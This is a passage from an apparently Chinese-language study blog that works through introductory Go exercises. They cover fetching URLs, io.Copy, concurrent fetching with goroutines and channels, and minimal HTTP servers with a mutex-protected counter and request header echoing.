			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		b<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
		resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: reading %s: %v\n"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> err<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/71/71/YEjyb3DJ_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_698"></a>练习</h4> 
<h5><a id="17_700"></a>练习1.7：</h5> 
<blockquote> 
 <p>函数调用io.Copy(dst, src)会从src中读取内容，并将读到的结果写入到dst中，使用这个函数替代例子中的ioutil.ReadAll来拷贝响应结构体到os.Stdout，避免申请一个缓冲区来存储，记得处理io.Copy返回结果中的错误</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> url <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		<span class="token comment">//b, err := ioutil.ReadAll(resp.Body)</span>
		<span class="token comment">//        io.Copy(dst Writer, src Reader)</span>
		b<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stdout<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
		resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">//fmt.Fprintf(os.Stderr, "fetch: reading %s: %v\n", url, err)</span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
			os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="18_733"></a>练习1.8：</h5> 
<blockquote> 
 <p>修改fetch这个范例，如果输入的url参数没有<code>http://</code>前缀的话，为这个<code>url</code>加上该前缀。你可能会用到<code>strings.HasPrefix</code>这个函数。</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strings"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> url <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// strings.HasPrefix</span>
		<span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"http://"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			url <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{<!-- --></span><span class="token string">"http://"</span><span class="token punctuation">,</span> url<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		<span class="token comment">//        io.Copy(dst Writer, src Reader)</span>
		b<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stdout<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
		resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
			os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/11/34/mYOJGJlu_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="19_769"></a>练习1.9：</h5> 
<blockquote> 
 <p>修改fetch打印出<code>HTTP</code>协议的状态码，可以从<code>resp.Status</code>变量得到该状态码</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> url <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"fetch: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		b <span class="token operator">:=</span> resp<span class="token punctuation">.</span>Status
		fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/81/0e/M53Pa5Jj_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="06_URL_793"></a>06 并发获取多个URL</h3> 
<ul><li><code>goroutine</code>是一种函数的并发执行方式，而<code>channel</code>是用来在<code>goroutine</code>之间进行参数传递</li><li><code>main</code>函数本身也运行在一个<code>goroutine</code>中，而<code>go function</code>则表示创建一个新的<code>goroutine</code>，并在这个新的<code>goroutine</code>中执行这个函数</li><li>当一个<code>goroutine</code>尝试在一个<code>channel</code>上做<code>send</code>或者<code>receive</code>操作时，这个<code>goroutine</code>会阻塞在调用处，直到另一个<code>goroutine</code>从这个<code>channel</code>里接收或者写入值，这样两个<code>goroutine</code>才会继续执行<code>channel</code>操作之后的逻辑</li><li>每一个fetch函数在执行时都会往channel里发送一个值（<code>ch &lt;- expression</code>），主函数负责接收这些值（<code>&lt;-ch</code>），程序用main函数来接收所有fetch函数传回的字符串，可以避免在goroutine异步执行还没有完成时main函数提前退出</li></ul> 
<pre><code class="prism language-go"><span class="token comment">// Fetchall fetches URLs in parallel and reports their times and sizes.</span>
<span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	start <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> url <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">go</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> ch<span class="token punctuation">)</span> <span class="token comment">// start a goroutine</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">for</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">&lt;-</span>ch<span class="token punctuation">)</span> <span class="token comment">// receive from channel ch</span>
	<span class="token punctuation">}</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%.2fs elapsed\n"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Since</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token builtin">string</span><span class="token punctuation">,</span> ch <span class="token keyword">chan</span><span class="token operator">&lt;-</span><span class="token builtin">string</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	start <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		ch <span class="token operator">&lt;-</span> fmt<span class="token punctuation">.</span><span class="token function">Sprint</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token comment">// send to channel ch</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	nbytes<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>ioutil<span class="token punctuation">.</span>Discard<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		ch <span class="token operator">&lt;-</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"while reading %s: %v"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	secs <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Since</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	ch <span class="token operator">&lt;-</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%.2fs %7d %s"</span><span class="token punctuation">,</span> secs<span class="token punctuation">,</span> nbytes<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/de/62/salz74aY_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_843"></a>练习</h4> 
<h5><a id="110_845"></a>练习1.10：</h5> 
<blockquote> 
 <p>找一个数据量比较大的网站，用本小节中的程序调研网站的缓存策略，对每个URL执行两遍请求，查看两次时间是否有较大的差别，并且每次获取到的响应内容是否一致，将响应结果输出，以便于进行对比</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token comment">// Fetchall fetches URLs in parallel and reports their times and sizes.</span>
<span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	start <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> url <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">go</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> ch<span class="token punctuation">)</span> <span class="token comment">// start a goroutine</span>
		<span class="token keyword">go</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> ch<span class="token punctuation">)</span> <span class="token comment">// start a goroutine</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">for</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">&lt;-</span>ch<span class="token punctuation">)</span> <span class="token comment">// receive from channel ch</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">&lt;-</span>ch<span class="token punctuation">)</span> <span class="token comment">// receive from channel ch</span>
	<span class="token punctuation">}</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%.2fs elapsed\n"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Since</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token builtin">string</span><span class="token punctuation">,</span> ch <span class="token keyword">chan</span><span class="token operator">&lt;-</span><span class="token builtin">string</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	start <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		ch <span class="token operator">&lt;-</span> fmt<span class="token punctuation">.</span><span class="token function">Sprint</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token comment">// send to channel ch</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	nbytes<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>ioutil<span class="token punctuation">.</span>Discard<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		ch <span class="token operator">&lt;-</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"while reading %s: %v"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	secs <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Since</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	ch <span class="token operator">&lt;-</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%.2fs %7d %s"</span><span class="token punctuation">,</span> secs<span class="token punctuation">,</span> nbytes<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/50/93/2WqtgURc_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="111_892"></a>练习1.11：</h5> 
<blockquote> 
 <p>在fetchall中尝试使用长一些的参数列表，比如使用在alexa.com的上百万网站里排名靠前的，如果一个网站没有回应，程序将采取怎样的行为？</p> 
</blockquote> 
<h3><a id="07_Web_895"></a>07 Web服务</h3> 
<ul><li><code>main</code>函数将所有发送到<code>/</code>路径下的请求和<code>handler</code>函数关联起来 
  <ul><li><code>/</code>开头的请求就是所有发送到当前站点上的请求，服务监听<code>8000</code>端口</li><li>发送到这个服务的“请求”是一个<code>http.Request</code>类型的对象，这个对象中包含了请求中的一系列相关字段</li><li>当请求到达服务器时，这个请求会被传给handler函数来处理</li></ul> </li></ul> 
<p><strong>server1</strong></p> 
<pre><code class="prism language-go"><span class="token comment">// Server1 is a minimal "echo" server.</span>
<span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net/http"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span> <span class="token comment">// each request calls handler</span>
	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"localhost:8000"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// handler echoes the Path component of the request URL r.</span>
<span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"URL.Path = %q\n"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/01/31/ydhOncJ9_o.png" alt="在这里插入图片描述"></p> 
<p><strong>server2</strong></p> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"sync"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> mu sync<span class="token punctuation">.</span>Mutex
<span class="token keyword">var</span> count <span class="token builtin">int</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/count"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"localhost:8001"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// handler echoes the Path component of the requested URL</span>
<span class="token keyword">func</span> <span class="token function">Handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 上锁</span>
	mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token comment">// 避免同一时刻两个请求去更新count</span>
	count<span class="token operator">++</span>
	<span class="token comment">// 保证每次修改变量的最多只有一个goroutine</span>
	mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"URL.Path = %q\n"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// counter echoes the number of calls so far</span>
<span class="token keyword">func</span> <span class="token function">counter</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Count %d\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span>
	mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/2f/28/tVJioWqf_o.png" alt="在这里插入图片描述"></p> 
<p><strong>server3</strong></p> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net/http"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> HandLer<span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"localhost:8001"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">HandLer</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"%s %s %s\n"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>Method<span class="token punctuation">,</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">,</span> r<span class="token punctuation">.</span>Proto<span class="token punctuation">)</span>
	<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> r<span class="token punctuation">.</span>Header <span class="token punctuation">{<!-- --></span>
		fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Header[%q] = %q\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// %q 带双引号的字符串"abc" 或 带单引号的 rune 'c'</span>
	fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Host = %q\n"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>RemoteAddr<span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"RemoteAddr = %q\n"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>RemoteAddr<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		log<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
